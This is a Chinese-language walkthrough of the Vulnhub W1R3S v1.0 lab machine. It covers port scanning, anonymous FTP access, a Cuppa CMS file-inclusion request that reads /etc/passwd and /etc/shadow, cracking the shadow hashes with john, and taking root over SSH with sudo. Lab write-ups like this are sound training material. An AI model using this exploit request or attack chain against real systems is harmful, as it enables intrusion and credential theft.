---
title: Vulnhub-w1r3s v1 0
published: 2025-03-09 16:17:52
tags: [Vulnhub]
category: 靶机
draft: false
---

# w1r3s.v1.0

> https://www.vulnhub.com/entry/w1r3s-101,220/
> 

思路：红队笔记

## 主机发现端口扫描

1. 使用nmap扫描网段类存活主机
    
    因为靶机是我最后添加的，所以靶机IP是133
    
    ```php
    nmap -sP 192.168.75.0/24
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-20 09:09 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00022s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00015s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.133
    Host is up (0.00021s latency).
    MAC Address: 00:0C:29:11:5B:7D (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00028s latency).
    MAC Address: 00:50:56:F8:B3:1A (VMware)
    Nmap scan report for 192.168.75.131
    Host is up.
    Nmap done: 256 IP addresses (5 hosts up) scanned in 2.14 seconds
    ```
    
2. 扫描主机开放端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.133
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-20 09:11 CST
    Nmap scan report for 192.168.75.133
    Host is up (0.0011s latency).
    Not shown: 55528 filtered tcp ports (no-response), 10003 closed tcp ports (conn-refused)
    PORT     STATE SERVICE
    21/tcp   open  ftp
    22/tcp   open  ssh
    80/tcp   open  http
    3306/tcp open  mysql
    MAC Address: 00:0C:29:11:5B:7D (VMware)
    ```
    
    开放了 `21，22，80，3306`
    
3. 扫描主机服务版本以及系统版本
    
    ```php
    nmap -sV -sT -O -p21,22,80,3306 192.168.75.133
    //
    PORT     STATE SERVICE VERSION
    21/tcp   open  ftp     vsftpd 2.0.8 or later
    22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
    80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
    3306/tcp open  mysql   MySQL (unauthorized)
    MAC Address: 00:0C:29:11:5B:7D (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9
    Network Distance: 1 hop
    Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    
    `vsftpd` 可能可以使用匿名登陆，可能会有信息泄露，所以优先级高
    
    `Apache`版本是`2.4.18`
    
    `MySql`未经授权，所以未能获取到版本信息
    
    操作系统版本**`Linux 3.10 - 4.11`** 或 **`Linux 3.2 - 4.9`**
    
    主机名为 `W1R3S.inc`
    
4. UDP扫描
    
    ```php
    nmap -sU 192.168.75.133
    //
    无数据
    ```
    
5. 扫描开放端口漏洞
    
    我如果不设置`--script-timeout 30s` 会一直卡在`98.xx%`
    
    ```php
    nmap -script=vuln -p21,22,80,3306 --script-timeout 30s  192.168.75.133
    //
    PORT     STATE SERVICE
    21/tcp   open  ftp
    22/tcp   open  ssh
    80/tcp   open  http
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    | http-enum: 
    |_  /wordpress/wp-login.php: Wordpress login page.
    3306/tcp open  mysql
    MAC Address: 00:0C:29:11:5B:7D (VMware)
    ```
    
    没有找到什么漏洞，可能是扫描时间过短的原因，这样子的话我们的优先级就是`21→80→3306→22` ，因为ftp可能造成文件泄露。web发现了wordpress的登陆页面，也有机会获得进度
    

## FTP渗透

1. 尝试下ftp是否能进行匿名登陆
    
    ```php
    ftp 192.168.75.133
    //
    Connected to 192.168.75.133.
    220 Welcome to W1R3S.inc FTP service.
    Name (192.168.75.133:root): anonymous
    331 Please specify the password.
    Password: 
    230 Login successful.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ```
    
    `230 Login successful` 登陆成功，接着查找信息
    
2. 把匿名用户能获取的所有文件下载下来，一共有五个文件
    
    `01.txt  02.txt  03.txt  employee-names.txt  worktodo.txt`
    
    查看内容
    
    ```php
    cat *.txt      
    New FTP Server For W1R3S.inc
    #
    #
    #
    #
    01ec2d8fc11c493b25029fb1f47f39ce
    #
    #
    #
    #
    #
    SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==
    ############################################
    ___________.__              __      __  ______________________   _________    .__               
    \__    ___/|  |__   ____   /  \    /  \/_   \______   \_____  \ /   _____/    |__| ____   ____  
      |    |   |  |  \_/ __ \  \   \/\/   / |   ||       _/ _(__  < \_____  \     |  |/    \_/ ___\ 
      |    |   |   Y  \  ___/   \        /  |   ||    |   \/       \/        \    |  |   |  \  \___ 
      |____|   |___|  /\___  >   \__/\  /   |___||____|_  /______  /_______  / /\ |__|___|  /\___  >
                    \/     \/         \/                \/       \/        \/  \/         \/     \/ 
    The W1R3S.inc employee list
    
    Naomi.W - Manager
    Hector.A - IT Dept
    Joseph.G - Web Design
    Albert.O - Web Design
    Gina.L - Inventory
    Rico.D - Human Resources
    
            ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡
    
    ....punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ
                                                                      
    ```
    
    - `New FTP Server For W1R3S.inc` 指的应该是 新的`W1R3S.inc` 公司的ftp服务器 ，新的就表示可能存在漏洞
    - `01ec2d8fc11c493b25029fb1f47f39ce`看着特征像是MD5，识别出来是：`This is not a password`
    - `SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==` 看着像是base64，识别出来是：`It is easy, but not that easy..`
    - 中间的Ascii艺术说的是`The W1R3S.inc`
    - 还有个职员表，不过只有姓名，在爆破时可能用的上
        
        ```php
        Naomi.W - Manager Hector.A - IT Dept Joseph.G - Web Design Albert.O - Web Design Gina.L - Inventory Rico.D - Human Resources
        ```
        
    - 最后有两行翻转过来的字符串，大概是
        
        ```php
        we have a lot of work to do, stop playtng around'.
        i don't think this is the way to root!
        ```
        
3. 好像没用…

## WEB渗透

1. 访问 `http://192.168.75.133/` ，页面是`apache`的默认页面，可能是刚安装完
2. 爆破目录都有啥，我们知道的只有`wordpress`的登录页
    
    ```php
     python .\dirsearch.py -u http://192.168.75.133/
     //
     [10:14:57] Starting:
    [10:14:58] 403 -  300B  - /.ht_wsr.txt
    [10:14:58] 403 -  303B  - /.htaccess.bak1
    [10:14:58] 403 -  303B  - /.htaccess.orig
    [10:14:58] 403 -  305B  - /.htaccess.sample
    [10:14:58] 403 -  303B  - /.htaccess.save
    [10:14:58] 403 -  303B  - /.htaccess_orig
    [10:14:58] 403 -  304B  - /.htaccess_extra
    [10:14:58] 403 -  301B  - /.htaccess_sc
    [10:14:58] 403 -  301B  - /.htaccessOLD
    [10:14:58] 403 -  302B  - /.htaccessOLD2
    [10:14:58] 403 -  294B  - /.html
    [10:14:58] 403 -  293B  - /.htm
    [10:14:58] 403 -  303B  - /.htpasswd_test
    [10:14:58] 403 -  299B  - /.htpasswds
    [10:14:58] 403 -  300B  - /.httr-oauth
    [10:14:58] 403 -  293B  - /.php
    [10:14:58] 403 -  294B  - /.php3
    [10:15:00] 403 -  301B  - /.htaccessBAK
    [10:15:03] 301 -  324B  - /administrator  ->  http://192.168.75.133/administrator/
    [10:15:03] 302 -    7KB - /administrator/  ->  installation/
    [10:15:03] 302 -    7KB - /administrator/index.php  ->  installation/
    [10:15:10] 301 -  321B  - /javascript  ->  http://192.168.75.133/javascript/
    [10:15:16] 403 -  302B  - /server-status
    [10:15:16] 403 -  303B  - /server-status/
    [10:15:21] 301 -    0B  - /wordpress/  ->  http://localhost/wordpress/
    [10:15:21] 200 -    1KB - /wordpress/wp-login.php
    ```
    
    存在`administrator`文件夹和`wordpress` ，先去查看`wordpress`
    
3. 来到`wordpress`登陆页面，输入之前的用户名，密码随便输，抓包尝试爆破,但是发现数据包host指向的是`localhost` ，也就是指向我们的`127.0.0.1` 
    
    ```php
    //数据包
    POST /wordpress/wp-login.php HTTP/1.1
    Host: localhost
    ....
    log=Naomi&pwd=123&wp-submit=Log+In&redirect_to=http%3A%2F%2Flocalhost%2Fwordpress%2Fwp-admin%2F&testcookie=1
    ```
    
    应该是还没配置好，我们去`administrator`目录看看
    
4. 跳转到访问`administator`目录跳转到`/administrator/installation/` 是个CMS安装页面，也、页面的title显示的是`Cuppa CMS` ，经查阅是一个内容管理系统的项目
    
    ![image.png](image%205.png)
    
    我们尝试`next` ，毕竟只有这一个交互，`Database Name` ，`Password`，`Email`都是空的
    
    ![image.png](image%206.png)
    
    尝试输入`Database Name` = test，`Password` = test ,`Email` = `test@tets.com` ,点击`next`
    
    ![image.png](image%207.png)
    
    数据表创建成功，不过管理员用户创建失败，并且交互只有一个`back` ，这块也走不下去了
    
5. 想到Cuppa也是一个开源项目，我们去查阅一下有没有漏洞，因为我们不知道CMS版本，所以都可以尝试下
    - 经查阅法cuppa存在文件包含漏洞，并且很容易利用
        
        > [https://bugtoolz.com/post/cs132020723/](https://bugtoolz.com/post/cs132020723/)
        > 
        
        在`/target/templates/default/html/windows/right.php` 下存在一个`$_POST['url']` ,提交可以访问任意文件
        
    - 访问并抓包`/administrator/templates/default/html/windows/right.php` 因为是在`administator`目录安装的
    - 抓到包后测试读取`/etc/passwd` ，记得修改包请求方法，默认访问时GET需要改成POST
        
        ```php
        //req
        POST /administrator/templates/default/html/windows/right.php HTTP/1.1
        Host: 192.168.75.133
        ....
        url=../../	../../etc/passwd
        ```
        
        读取成功
        
        ```php
        //res
        root:x:0:0:root:/root:/bin/bash
        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
        bin:x:2:2:bin:/bin:/usr/sbin/nologin
        sys:x:3:3:sys:/dev:/usr/sbin/nologin
        sync:x:4:65534:sync:/bin:/bin/sync
        games:x:5:60:games:/usr/games:/usr/sbin/nologin
        man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
        lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
        mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
        news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
        uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
        proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
        www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
        backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
        list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
        irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
        gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
        nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
        systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
        systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
        systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
        systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
        syslog:x:104:108::/home/syslog:/bin/false
        _apt:x:105:65534::/nonexistent:/bin/false
        messagebus:x:106:110::/var/run/dbus:/bin/false
        uuidd:x:107:111::/run/uuidd:/bin/false
        lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
        whoopsie:x:109:117::/nonexistent:/bin/false
        avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
        avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
        dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
        colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
        speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
        hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
        kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
        pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
        rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
        saned:x:119:127::/var/lib/saned:/bin/false
        usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
        w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash
        sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
        ftp:x:122:129:ftp daemon,,,:/srv/ftp:/bin/false
        mysql:x:123:130:MySQL Server,,,:/nonexistent:/bin/false
        ```
        
    - 能读取`passwd`我们就继续读取`shadow`文件
        
        ```php
        root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
        daemon:*:17379:0:99999:7:::
        bin:*:17379:0:99999:7:::
        sys:*:17379:0:99999:7:::
        sync:*:17379:0:99999:7:::
        games:*:17379:0:99999:7:::
        man:*:17379:0:99999:7:::
        lp:*:17379:0:99999:7:::
        mail:*:17379:0:99999:7:::
        news:*:17379:0:99999:7:::
        uucp:*:17379:0:99999:7:::
        proxy:*:17379:0:99999:7:::
        www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::
        backup:*:17379:0:99999:7:::
        list:*:17379:0:99999:7:::
        irc:*:17379:0:99999:7:::
        gnats:*:17379:0:99999:7:::
        nobody:*:17379:0:99999:7:::
        systemd-timesync:*:17379:0:99999:7:::
        systemd-network:*:17379:0:99999:7:::
        systemd-resolve:*:17379:0:99999:7:::
        systemd-bus-proxy:*:17379:0:99999:7:::
        syslog:*:17379:0:99999:7:::
        _apt:*:17379:0:99999:7:::
        messagebus:*:17379:0:99999:7:::
        uuidd:*:17379:0:99999:7:::
        lightdm:*:17379:0:99999:7:::
        whoopsie:*:17379:0:99999:7:::
        avahi-autoipd:*:17379:0:99999:7:::
        avahi:*:17379:0:99999:7:::
        dnsmasq:*:17379:0:99999:7:::
        colord:*:17379:0:99999:7:::
        speech-dispatcher:!:17379:0:99999:7:::
        hplip:*:17379:0:99999:7:::
        kernoops:*:17379:0:99999:7:::
        pulse:*:17379:0:99999:7:::
        rtkit:*:17379:0:99999:7:::
        saned:*:17379:0:99999:7:::
        usbmux:*:17379:0:99999:7:::
        w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
        sshd:*:17554:0:99999:7:::
        ftp:*:17554:0:99999:7:::
        mysql:!:17554:0:99999:7:::
        ```
        
6. 把`root`，`www-data`，`w1r3s`用户进行破解
    - 将内容保存为`shadow.hash` 传入到kali
        
        ```php
        root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
        www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::
        w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
        ```
        
    - 使用`john`破解
        
        ```php
        john shadow.hash 
        //
        reated directory: /root/.john
        Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
        Use the "--format=HMAC-SHA256" option to force loading these as that type instead
        Using default input encoding: UTF-8
        Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
        Cost 1 (iteration count) is 5000 for all loaded hashes
        Will run 8 OpenMP threads
        Proceeding with single, rules:Single
        Press 'q' or Ctrl-C to abort, almost any other key for status
        www-data         (www-data)     
        Almost done: Processing the remaining buffered candidate passwords, if any.
        Proceeding with wordlist:/usr/share/john/password.lst
        computer         (w1r3s)     
        Proceeding with incremental:ASCII
        ```
        
        暂时破解出来了两个用户的密码，除了`root`的，权限看着应该是`w1r3s`的更高
        
7. 使用`ssh`登录`w1r3s` 用户，并查看其权限
    - 登陆成功
        
        ```php
        ssh w1r3s@192.168.75.133 
        //
        ----------------------
        Think this is the way?
        ----------------------
        Well,........possibly.
        ----------------------
        w1r3s@192.168.75.133's password: 
        Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)
        
         * Documentation:  https://help.ubuntu.com
         * Management:     https://landscape.canonical.com
         * Support:        https://ubuntu.com/advantage
        
        108 packages can be updated.
        6 updates are security updates.
        
        .....You made it huh?....
        Last login: Mon Jan 22 22:47:27 2018 from 192.168.0.35
        w1r3s@W1R3S:~$ 
        ```
        
    - 查看权限
        
        ```php
        w1r3s@W1R3S:~$ whoami
        w1r3s
        //
        w1r3s@W1R3S:~$ uname -a
        Linux W1R3S 4.13.0-36-generic #40~16.04.1-Ubuntu SMP Fri Feb 16 23:25:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
        //
        w1r3s@W1R3S:~$ ip a
        1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
            link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
            inet 127.0.0.1/8 scope host lo
               valid_lft forever preferred_lft forever
            inet6 ::1/128 scope host 
               valid_lft forever preferred_lft forever
        2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
            link/ether 00:0c:29:11:5b:7d brd ff:ff:ff:ff:ff:ff
            inet 192.168.75.133/24 brd 192.168.75.255 scope global dynamic ens33
               valid_lft 1134sec preferred_lft 1134sec
            inet6 fe80::aae5:6c48:85ba:de8/64 scope link 
               valid_lft forever preferred_lft forever
        // 直接进去root用户了
        w1r3s@W1R3S:~$ sudo -i
        root@W1R3S:
        //
        root@W1R3S:~# whoami
        root
        ```
        
        提权成功
        
8. 读取flag.txt文件，登录root后就在当前目录下
    
    ```php
    
    // flag.txt
    -----------------------------------------------------------------------------------------
       ____ ___  _   _  ____ ____      _  _____ _   _ _        _  _____ ___ ___  _   _ ____  
      / ___/ _ \| \ | |/ ___|  _ \    / \|_   _| | | | |      / \|_   _|_ _/ _ \| \ | / ___| 
     | |  | | | |  \| | |  _| |_) |  / _ \ | | | | | | |     / _ \ | |  | | | | |  \| \___ \ 
     | |__| |_| | |\  | |_| |  _ <  / ___ \| | | |_| | |___ / ___ \| |  | | |_| | |\  |___) |
      \____\___/|_| \_|\____|_| \_\/_/   \_\_|  \___/|_____/_/   \_\_| |___\___/|_| \_|____/ 
                                                                                            
    -----------------------------------------------------------------------------------------
    
                              .-----------------TTTT_-----_______
                            /''''''''''(______O] ----------____  \______/]_
         __...---'"""\_ --''   Q                               ___________@
     |'''                   ._   _______________=---------"""""""
     |                ..--''|   l L |_l   |
     |          ..--''      .  /-___j '   '
     |    ..--''           /  ,       '   '
     |--''                /           `    \
                          L__'         \    -
                                        -    '-.
                                         '.    /
                                           '-./
    
    ----------------------------------------------------------------------------------------
      YOU HAVE COMPLETED THE
                   __      __  ______________________   _________
                  /  \    /  \/_   \______   \_____  \ /   _____/
                  \   \/\/   / |   ||       _/ _(__  < \_____  \ 
                   \        /  |   ||    |   \/       \/        \
                    \__/\  /   |___||____|_  /______  /_______  /.INC
                         \/                \/       \/        \/        CHALLENGE, V 1.0
    ----------------------------------------------------------------------------------------
    
    CREATED BY SpecterWires
    
    ----------------------------------------------------------------------------------------
    
    ```